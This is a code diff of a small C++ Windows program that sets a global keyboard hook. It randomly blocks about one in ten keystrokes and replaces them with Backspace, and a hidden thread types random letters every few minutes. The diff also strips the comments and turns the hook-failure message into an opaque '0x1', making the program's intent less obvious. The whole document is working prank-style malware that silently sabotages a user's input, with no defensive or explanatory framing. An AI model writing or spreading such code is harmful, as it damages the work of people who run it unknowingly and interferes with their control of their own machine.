@@ -4,16 +4,19 @@
 #include <thread>
 #include <chrono>
 
+using namespace std;
+
+INPUT input1 = { 0 };
+INPUT input2 = { 0 };
+
 LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
     if (nCode >= 0 && wParam == WM_KEYDOWN) {
-        KBDLLHOOKSTRUCT* pKeyStruct = (KBDLLHOOKSTRUCT*)lParam;
-
-        if ((std::rand() % 10) == 0) { // 10% шанс
-            INPUT input = { 0 };
-            input.type = INPUT_KEYBOARD;
-            input.ki.wVk = VK_BACK; // Клавиша Backspace
-            SendInput(1, &input, sizeof(INPUT));
-            return 1; // Блокируем исходное нажатие
+        if ((rand() % 10) == 0) {
+            input1 = { 0 };
+            input1.type = INPUT_KEYBOARD;
+            input1.ki.wVk = VK_BACK;
+            SendInput(1, &input1, sizeof(INPUT));
+            return 1;
         }
     }
     return CallNextHookEx(NULL, nCode, wParam, lParam);
@@ -21,31 +24,31 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
 
 void RandomKeyPresser() {
     while (true) {
-        int sleepTime = (std::rand() % 181 + 120) * 1000;
-        std::this_thread::sleep_for(std::chrono::milliseconds(sleepTime));
+        //this_thread::sleep_for(chrono::milliseconds((rand() % 6 + 5) * 1000));
+        this_thread::sleep_for(chrono::milliseconds((rand() % 181 + 120) * 1000));
 
-        INPUT input = { 0 };
-        input.type = INPUT_KEYBOARD;
+        input2 = { 0 };
+        input2.type = INPUT_KEYBOARD;
         int key;
-        if (std::rand() % 2 == 0) {
-            key = (std::rand() % 26) + 65; // Генерация случайной заглавной буквы (A-Z)
+        if (rand() % 2 == 0) {
+            key = (rand() % 26) + 65;
         }
         else {
-            key = (std::rand() % 26) + 97; // Генерация случайной строчной буквы (a-z)
+            key = (rand() % 26) + 97;
         }
-        input.ki.wVk = key;
-        SendInput(1, &input, sizeof(INPUT));
+        input2.ki.wVk = key;
+        SendInput(1, &input2, sizeof(INPUT));
     }
 }
 
-int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
-    std::srand(static_cast<unsigned int>(std::time(nullptr)));
+int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
+    srand(static_cast<unsigned int>(time(nullptr)));
 
-    std::thread randomKeyThread(RandomKeyPresser);
+    thread randomKeyThread(RandomKeyPresser);
 
     HHOOK hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);
     if (!hHook) {
-        MessageBox(NULL, L"Не удалось установить хук", L"Ошибка", MB_ICONERROR);
+        MessageBox(NULL, L"0x1", L"ERROR", MB_ICONERROR); //means 'Hook has not been installed successfully'
         return 1;
     }
 
